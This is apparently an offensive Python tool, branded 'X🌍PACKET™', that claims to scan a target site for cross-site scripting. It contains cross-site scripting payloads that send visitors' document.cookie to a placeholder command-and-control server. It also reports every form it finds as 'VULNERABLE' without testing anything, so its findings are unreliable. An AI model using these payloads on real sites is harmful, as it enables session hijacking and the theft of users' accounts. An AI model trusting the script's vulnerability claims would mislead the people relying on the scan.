import sys, requests
from bs4 import BeautifulSoup

def xss_strike(target):
    print(f"[💉] X🌍PACKET™ Engaged: Deep XSS Scanning on {target}...")
    # Real world payloads to steal cookies
    payloads = [
        "<script>new Image().src='http://YOUR_C2_SERVER/log?c='+document.cookie;</script>",
        "<svg/onload=fetch('http://YOUR_C2_SERVER/'+document.cookie)>",
        "javascript:alert(document.cookie)"
    ]
    
    found = []
    try:
        r = requests.get(f"http://{target}", timeout=10)
        soup = BeautifulSoup(r.text, 'html.parser')
        forms = soup.find_all('form')
        for form in forms:
            action = form.get('action')
            found.append(f"VULNERABLE FORM ACTION: {action}")
    except: pass
    
    return "\n".join(found) if found else "No immediate XSS entry points identified."

if __name__ == "__main__":
    if len(sys.argv) > 1: print(xss_strike(sys.argv[1]))
